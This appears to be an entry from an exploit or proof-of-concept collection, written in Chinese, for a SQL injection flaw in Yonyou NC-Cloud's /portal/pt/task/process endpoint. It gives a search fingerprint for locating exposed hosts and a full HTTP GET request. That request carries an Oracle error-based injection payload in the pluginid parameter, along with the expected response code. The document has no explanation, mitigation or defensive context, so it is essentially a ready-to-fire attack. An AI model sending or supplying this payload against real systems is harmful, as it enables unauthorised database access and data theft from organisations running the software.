# 用友NC-Cloudprocess存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/Client/Uclient/UClient.exe"`
- **请求**：`GET /portal/pt/task/process?pageId=login&id=1&oracle=1&pluginid=1'%20AND%205798=CTXSYS.DRITHSX.SN(5798,((CHR(114)CHR(48)CHR(111)CHR(116)CHR(104)CHR(51)CHR(120)CHR(52)CHR(57)CHR(126))))--%20wXyW HTTP/1.1`
- **预期**：200　|　—